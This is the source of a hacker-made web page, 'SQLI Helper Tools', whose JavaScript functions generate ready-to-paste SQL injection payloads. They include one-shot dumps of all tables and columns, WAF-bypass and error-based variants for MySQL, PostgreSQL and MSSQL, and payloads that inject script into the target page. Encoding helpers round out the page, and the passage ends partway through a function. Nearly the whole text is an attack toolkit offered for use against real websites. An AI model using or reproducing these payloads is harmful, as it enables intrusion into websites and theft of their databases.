<html>
<head>
<title>N19gh7h4wk - SQLI Helper Tools</title> 
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/> 
<meta content='index, follow' name='googlebot'/> 
<meta content='all' name='spiders'/> 
<meta content='all' name='WEBCRAWLERS'/>
<meta content='Index, Follow' name='robots'/> 
<meta content='Versailles' name='author'/> 
<meta content='Sec7or Team' name='author'/>

<style> 
body { padding-top: 60px; background: url(http://img02.deviantart.net/9d9d/i/2010/273/9/b/in_the_snow_by_kitsunebaka91-d2myr0w.jpg) top center no-repeat;
background-attachment:fixed;
} 
</style>

<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css"> <script src="http://code.jquery.com/jquery-2.1.3.min.js"></script> <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script> 




<script type="text/javascript"> 

// CheatSheet Dios Collection Pakage
// By Versailles
// FB : facebook.com/thever.sevenfoldism
// Dont Change Copyright
// Recoded by : N19h7h4wk
// Thanks to Versailles from Sec7or Team


function rplc(){

function replaceAll(str, find, replace) { return str.replace(new RegExp(find, 'g'), replace); }

var str = document.getElementById('str').value;
var wrd = document.getElementById('wrd').value;
var rep = document.getElementById('rep').value;

hasil = replaceAll(str,wrd,rep);
document.getElementById('hex').value = hasil;

}


      var encN=1;
      function decodeTxt(s){
      var s1=unescape(s.substr(0,s.length-1));
      var t='';
      for(i=0;i<s1.length;i++)t+=String.fromCharCode(s1.charCodeAt(i)-s.substr(s.length-1,1));
      return unescape(t);
      }

      function encodeTxt(s){
      s=escape(s);
      var ta=new Array();
      for(i=0;i<s.length;i++)ta[i]=s.charCodeAt(i)+encN;
      return ""+escape(eval("String.fromCharCode("+ta+")"))+encN;
      }

      function escapeTxt(os){
      var ns='';
      var t;
      var chr='';
      var cc='';
      var tn='';
      for(i=0;i<256;i++){
      tn=i.toString(16);
      if(tn.length<2)tn="0"+tn;
      cc+=tn;
      chr+=unescape('%'+tn);
      }
      cc=cc.toUpperCase();
      os.replace(String.fromCharCode(13)+'',"%13");
      for(q=0;q<os.length;q++){
      t=os.substr(q,1);
      for(i=0;i<chr.length;i++){
      if(t==chr.substr(i,1)){
      t=t.replace(chr.substr(i,1),"%"+cc.substr(i*2,2));
      i=chr.length;
      }}
      ns+=t;
      }
      return ns;
      }
      function unescapeTxt(s){
      return unescape(s);
      }
      function wF(s){
      document.write(decodeTxt(s));
      }

function esc(){
var str = document.getElementById('str').value;
hasil = escapeTxt(str);
document.getElementById('hex').value = hasil;
}


function unesc(){
var str = document.getElementById('str').value;
hasil = unescapeTxt(str);
document.getElementById('hex').value = hasil;
}

var base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
var base64DecodeChars = new Array(
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
    -1,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
    -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

function base64encode(str) {
    var out, i, len;
    var c1, c2, c3;

    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
    c1 = str.charCodeAt(i++) & 0xff;
    if(i == len)
    {
        out += base64EncodeChars.charAt(c1 >> 2);
        out += base64EncodeChars.charAt((c1 & 0x3) << 4);
        out += "==";
        break;
    }
    c2 = str.charCodeAt(i++);
    if(i == len)
    {
        out += base64EncodeChars.charAt(c1 >> 2);
        out += base64EncodeChars.charAt(((c1 & 0x3)<< 4) | ((c2 & 0xF0) >> 4));
        out += base64EncodeChars.charAt((c2 & 0xF) << 2);
        out += "=";
        break;
    }
    c3 = str.charCodeAt(i++);
    out += base64EncodeChars.charAt(c1 >> 2);
    out += base64EncodeChars.charAt(((c1 & 0x3)<< 4) | ((c2 & 0xF0) >> 4));
    out += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >>6));
    out += base64EncodeChars.charAt(c3 & 0x3F);
    }
    return out;
}

function base64decode(str) {
    var c1, c2, c3, c4;
    var i, len, out;

    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
    /* c1 */
    do {
        c1 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
    } while(i < len && c1 == -1);
    if(c1 == -1)
        break;

    /* c2 */
    do {
        c2 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
    } while(i < len && c2 == -1);
    if(c2 == -1)
        break;

    out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

    /* c3 */
    do {
        c3 = str.charCodeAt(i++) & 0xff;
        if(c3 == 61)
        return out;
        c3 = base64DecodeChars[c3];
    } while(i < len && c3 == -1);
    if(c3 == -1)
        break;

    out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

    /* c4 */
    do {
        c4 = str.charCodeAt(i++) & 0xff;
        if(c4 == 61)
        return out;
        c4 = base64DecodeChars[c4];
    } while(i < len && c4 == -1);
    if(c4 == -1)
        break;
    out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}

function utf16to8(str) {
    var out, i, len, c;

    out = "";
    len = str.length;
    for(i = 0; i < len; i++) {
    c = str.charCodeAt(i);
    if ((c >= 0x0001) && (c <= 0x007F)) {
        out += str.charAt(i);
    } else if (c > 0x07FF) {
        out += String.fromCharCode(0xE0 | ((c >> 12) & 0x0F));
        out += String.fromCharCode(0x80 | ((c >>  6) & 0x3F));
        out += String.fromCharCode(0x80 | ((c >>  0) & 0x3F));
    } else {
        out += String.fromCharCode(0xC0 | ((c >>  6) & 0x1F));
        out += String.fromCharCode(0x80 | ((c >>  0) & 0x3F));
    }
    }
    return out;
}

function utf8to16(str) {
    var out, i, len, c;
    var char2, char3;

    out = "";
    len = str.length;
    i = 0;
    while(i < len) {
    c = str.charCodeAt(i++);
    switch(c >> 4)
    { 
      case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7:
        // 0xxxxxxx
        out += str.charAt(i-1);
        break;
      case 12: case 13:
        // 110x xxxx   10xx xxxx
        char2 = str.charCodeAt(i++);
        out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
        break;
      case 14:
        // 1110 xxxx  10xx xxxx  10xx xxxx
        char2 = str.charCodeAt(i++);
        char3 = str.charCodeAt(i++);
        out += String.fromCharCode(((c & 0x0F) << 12) |
                       ((char2 & 0x3F) << 6) |
                       ((char3 & 0x3F) << 0));
        break;
    }
    }

    return out;
}

function CharToHex(str) {
    var out, i, len, c, h;

    out = "";
    len = str.length;
    i = 0;
    while(i < len) 
    {
	    c = str.charCodeAt(i++);
	    h = c.toString(16);
	    if(h.length < 2)
	    	h = "0" + h;
	    
	    out += "\\x" + h + " ";
	    if(i > 0 && i % 8 == 0)
	    	out += "\r\n";
    }

    return out;
}

function b64_enc() {
	var str = document.getElementById('str').value;
	document.getElementById('hex').value = base64encode(utf16to8(str));
}

function b64_dec() {
	var str = document.getElementById('str').value;
	var opts = "checked";

	if(opts.checked)
	{
		document.getElementById('hex').value = CharToHex(base64decode(str));
	}
	else
	{
		document.getElementById('hex').value = utf8to16(base64decode(str));
	}
}



function d2h(d) {return d.toString(16);} 
function Str2Hex() { 
var tmp = document.getElementById('str').value; 
var str = ''; 
for (var i=0; i<tmp.length; i++) { 
c = tmp.charCodeAt(i); 
str += d2h(c) + ''; } 
document.getElementById('hex').value = str; }

function h2d(h) { 
return parseInt( h, 16 ); }
function Hex2Str(){
		 var string = document.getElementById('str').value; 		
		var string = string.toLowerCase();
		string = string.replace( /%/g, '' );
		string = string.replace( /[^0-9abcdefg]/g, '' );

		var charStringArray = new Array();
		var buffer = '';
		var hasil = '';
		for ( var c = 0 ; c < string.length ; c++ ) {
		  buffer += string.charAt( c ).toString();
		  if ( buffer.length >= 2 ) {
			hasil += String.fromCharCode( h2d( buffer ) );
			buffer = '';
		  }
		}   		
document.getElementById('hex').value = hasil; 			
	}



function kolom() {

var columns = prompt( "Total Columns ?", "48" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var kolom = "+UNION+SELECT+" + colArray.join( ',' ); document.getElementById('dios').value = kolom;
  }

function dios1(){
var dios1 = '(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)';
document.getElementById('dios').value = dios1;
}

function dios2(){
var dios2 = '(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.coLumns )where(@:=concat(@,0x3c6c693e,table_name,0x203a3a20,column_name))),@)))';
document.getElementById('dios').value = dios2;
}

function dios3(){
var dios3 = 'make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)';
document.getElementById('dios').value = dios3;
}

function dios4(){
var dios4 = "export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0x203a3a20,2)),@,2)";
document.getElementById('dios').value = dios4;
}


function xssdios(){
var xssdios = 'concat(0x3c2f6469763e3c7363726970743e616c6572742827,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat(@x,0x5c6e,table_name,0x203a3a20,column_name))))x),0x27293c2f7363726970743e)';
document.getElementById('dios').value = xssdios;
}


function makman(){
var makman = alert("SQLIGODS SYNTAX V 1.0 \n\nBY MAKMAN");
var makman = "concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e6420777269746520276d616b6d616e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c6d616b6d616e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f726420276d616b6d616e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e30204279204d616b4d616e3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0x3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c30783363363233653363363636663665373432303633366636633666373233643732363536343365323035333531346336393437346634343733323035333739366537343631373832303536323033313265333032303432373932303464363136623464363136653363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652c307833633733363337323639373037343365373137353635373237393364323232323362363636663732323836393364333133623639336336333666366336333665373433623639326232623239376237313735363537323739336437313735363537323739326236333666366336653631366436353562363935643262323232633330373833323330333336313333363133323330326332323362376437353732366333643735373236633265373236353730366336313633363532383232323732323263323232353332333732323239336236343664373037313735363537323739336437353732366332653732363537303663363136333635323832323664363136623664363136653232326332323238373336353663363536333734323834303239323036363732366636643238373336353663363536333734323834303361336433303738333033303239323032633238373336353663363536333734323032383430323932303636373236663664323832323262363436323262323232653232326237343632366332623232323937373638363537323635323834303239323036393665323032383430336133643633366636653633363137343566373737333238333037383332333032633430326332323262373137353635373237393262323233303738333336333336333233373332333336353239323932393239363132393232323933623634366636333735366436353665373432653737373236393734363532383232336336313230363837323635363633643237323232623634366437303731373536353732373932623232323733653433366336393633366232303438363537323635323037343666323034343735366437303230373436383639373332303737363836663663363532303534363136323663363533633631336532323239336233633266373336333732363937303734336529292929223b75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c61636528226d616b6d616e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)";
document.getElementById('dios').value = makman;
}

function trjn(){
var trjn = 'concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e,if((@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1,2,0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e),0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/';
document.getElementById('dios').value = trjn;
}

function trjnx(){
var trjnx = "concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)";
document.getElementById('dios').value = trjnx;
}

function bypsfrm(){
var bypsfrm = alert("Put after parameter id , and Replace Vuln Column With @sec7or");
var bypsfrm = '+and@sec7or:=concat(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x203a3a20,column_name)),@)+/*!50000UNION*/+SELECT+';
document.getElementById('dios').value = bypsfrm;
}

function ebf(){ 
var ebf = "(SELECT!x-~0.FROM(SELECT(concat_ws(0x3a3a,user(),@@version,database(),concat(@:=0,(Select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@)))x)a)";
document.getElementById('dios').value = ebf;
}

function poligon(){ 
var poligon = "polygon((Select*from((SELECT(!x-~0)FROM(SELECT(concat_ws(0x203a3a20,user(),@@version,database(),(Select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())))x)a)b)))";
document.getElementById('dios').value = poligon;
}

function multipoint(){
var multipoint = alert("It is only for mysql < 5.5 \n\nHow To Use\n\n1.remove parameter id and change it with the query \nif there s still any table that doesnt show completely just increase the limit ,number 20 in limit 1,20 is our assumption how many tables there in the site..\n\nM@db100d");
var multipoint = "multipoint((select*from(select!x-~0.from(select(select+group_concat(table_name+separator+0x0b)from(select+table_name+from+information_schema.tables+where+table_schema!='information_schema'+limit+1,20)c)x)j)h))";
document.getElementById('dios').value = multipoint;
}

function postgre(){
var postgre = "(select+string_agg(concat(table_name,'::',column_name),$$<li>$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
document.getElementById('dios').value = postgre;
}

function mssql(){
var mssql = "(select+concat('',table_name,'::',column_name)from+information_schema.columns+for+xml+path(''))";
document.getElementById('dios').value = mssql;
}

function bof(){
var bof = "+and(SELECT+1)=(SELECT+0x41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141)/*!50000UNION*/SELECT+";
document.getElementById('dios').value = bof;

}


function version1(){
var v1 = 'version()';
document.getElementById('dios').value = v1;
}

function version2(){
var v2 = '@@version';
document.getElementById('dios').value = v2;
}

function version3(){
var v3 = '@@GLOBAL.VERSION';
document.getElementById('dios').value = v3;
}

function version4(){
var v4 = "(select+variable_value+from+information_schema.session_variables+where+variable_name+like+0x56455253494f4e)";
document.getElementById('dios').value = v4;
}

function version5(){
var v5 = "(Select+variable_value+from+information_schema.global_variables+where+variable_name=0x76657273696f6e)";
document.getElementById('dios').value = v5;
}

function user1(){
var u1 = 'user()';
document.getElementById('dios').value = u1;
}

function user2(){
var u2 = 'CURRENT_USER()';
document.getElementById('dios').value = u2;
}

function user3(){
var u3 = 'SYSTEM_USER()';
document.getElementById('dios').value = u3;
}

function user4(){
var u4 = 'SESSION_USER()';
document.getElementById('dios').value = u4;
}

function user5(){
var u5 = 'SUBSTRING_INDEX(USER(),0x40,1)';
document.getElementById('dios').value = u5;
}

function user6(){
var u6 = '(SELECT+CONCAT(USER)+FROM+INFORMATION_SCHEMA.PROCESSLIST)';
document.getElementById('dios').value = u6;
}

function db1(){
var d1 = 'DATABASE()';
document.getElementById('dios').value = d1;
}

function db2(){
var d2 = 'SCHEMA()';
document.getElementById('dios').value = d2;
}

function db3(){
var d3 = '(SELECT+CONCAT(DB)+FROM+INFORMATION_SCHEMA.PROCESSLIST)';
document.getElementById('dios').value = d3;
}

function o1(){
var o1 = '@@HOSTNAME';
document.getElementById('dios').value = o1;
}

function o2(){
var o2 = '@@VERSION_COMPILE_MACHINE';
document.getElementById('dios').value = o2;
}

function o3(){
var o3 = '@@VERSION_COMPILE_OS';
document.getElementById('dios').value = o3;
}

function o4(){
var o4 = '@@BASEDIR';
document.getElementById('dios').value = o4;
}

function o5(){
var o5 = '@@HAVE_OPENSSL';
document.getElementById('dios').value = o5;
}

function o6(){
var o6 = '@@HAVE_SYMLINK';
document.getElementById('dios').value = o6;
}

function o7(){
var o7 = '@@PORT';
document.getElementById('dios').value = o7;
}

function o8(){
var o8 = '@@SOCKET';
document.getElementById('dios').value = o8;
}

function xssqli(){
var xssqli = prompt('Input Your Query','VERSION()');
var xssqli = "concat(0x3c2f6469763e3c7363726970743e616c6572742827,"+xssqli+",0x27293c2f7363726970743e)";
document.getElementById('dios').value = xssqli;
}

function mydios(){
var mydios = "concat(0x3c2f6469763e3c7363726970743e616c6572742827,0x496e6a6563746564204279205665727361696c6c65735c6e5c6e,VERSION(),0x205b20,@@VERSION_COMPILE_OS,0x205d5c6e,0x55736572203e3e20,USER(),0x5c6e,0x44426e616d65203e3e20,DATABASE(),0x5c6e5c6e,concat(0x546f74616c20446174616261736573205b20,(select+count(*)from+information_schema.schemata)),0x205d5c6e,concat(0x546f74616c205461626c6573205b20,(select+count(*)from+information_schema.tables+where+table_Schema=database())),0x205d5c6e,concat(0x546f74616c20436f6c756d6e73205b20,(select+count(*)from+information_schema.columns+where+table_Schema=database())),0x205d5c6e,(select(@x)from(select(@x:=0x00),(@num:=0),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat(@x,0x5c6e,LPAD(@num:=@num%2b1,3,0x30),0x2e20,table_name,0x203a3a20,column_name))))x),0x27293c2f7363726970743e)";
document.getElementById('dios').value = mydios;
}

function mydios2(){
var mydios2 = "concat(0x496e6a6563746564204279205665727361696c6c65733c62723e,VERSION(),0x205b20,@@VERSION_COMPILE_OS,0x205d3c62723e,0x55736572203e3e20,USER(),0x3c62723e,0x44426e616d65203e3e20,DATABASE(),0x3c62723e,concat(0x546f74616c20446174616261736573205b20,(select+count(*)from+information_schema.schemata)),0x205d3c62723e,concat(0x546f74616c205461626c6573205b20,(select+count(*)from+information_schema.tables+where+table_Schema=database())),0x205d3c62723e,concat(0x546f74616c20436f6c756d6e73205b20,(select+count(*)from+information_schema.columns+where+table_Schema=database())),0x205d3c62723e,(select(@x)from(select(@x:=0x00),(@num:=0),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat(@x,0x3c62723e,LPAD(@num:=@num%2b1,3,0x30),0x2e20,table_name,0x203a3a20,column_name))))x))";
document.getElementById('dios').value = mydios2;
}

function hx(){
var hx = prompt('Input Your Query','VERSION()');
var hx = "hex(unhex("+hx+"))";
document.getElementById('dios').value = hx;
}

function cn(){
var cn = prompt('Input Your Query','VERSION()');
var cn = "convert("+cn+"+using+latin1)";
document.getElementById('dios').value = cn;
} 

function cs(){
var cs = prompt('Input Your Query','VERSION()');
var cs = "cast("+cs+"+as+char)";
document.getElementById('dios').value = cs;
}

function cp(){
var cp = prompt('Input Your Query','VERSION()');
var cp = "uncompress(compress("+cp+")) ";
document.getElementById('dios').value = cp;
}

function aes(){
var aes = prompt('Input Your Query','VERSION()');
var aes = "aes_decrypt(aes_encrypt("+aes+",1),1)";
document.getElementById('dios').value = aes;
}

function tblc(){
var tblc = alert("Count Total Tables with Table Name");
var tblc = "concat(@c:=0x00,if((select+count(*)+from(information_schema.tables)where+table_schema=database()+and+@c:=concat(@c,0x3c6c693e,@tbl:=table_name,0x203a3a20,(select+count(*)from+information_schema.columns+where+table_Schema=database()+and+table_name=@tbl))),0x00,0x00),@c)";
document.getElementById('dios').value = tblc;
}

function dbc(){
var dbc = alert("Count Total Databases");
var dbc = "concat(0x546f74616c20446174616261736573203e3e20,(select+count(*)from+information_schema.schemata))";
document.getElementById('dios').value = dbc;
}

function tottbl(){
var tottbl = alert("Count Total Tables");
var tottbl = "concat(0x546f74616c205461626c6573203e3e20,(select+count(*)from+information_schema.tables+where+table_Schema=database()))";
document.getElementById('dios').value = tottbl;
}

function totcol(){
var totcol = alert("Count Total Columns");
var totcol = "concat(0x546f74616c20436f6c756d6e73203e3e20,(select+count(*)from+information_schema.columns+where+table_Schema=database()))"; 
document.getElementById('dios').value = totcol;
}

function countdb(){
var countdb = alert("Count Total Databases with Database Name");
var countdb = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)"; document.getElementById('dios').value = countdb;
}



function about(){
